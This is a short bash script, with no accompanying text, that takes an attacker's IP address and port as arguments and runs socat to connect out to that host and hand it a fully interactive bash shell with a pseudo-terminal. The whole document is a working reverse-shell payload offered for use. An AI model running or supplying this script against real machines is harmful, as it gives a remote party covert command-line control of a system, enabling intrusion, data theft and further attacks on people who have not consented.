#!/bin/bash
ATTACKER_IP=$1
PORT=$2

socat TCP:$ATTACKER_IP:$PORT EXEC:"bash -li",pty,stderr,setsid,sigint,sane
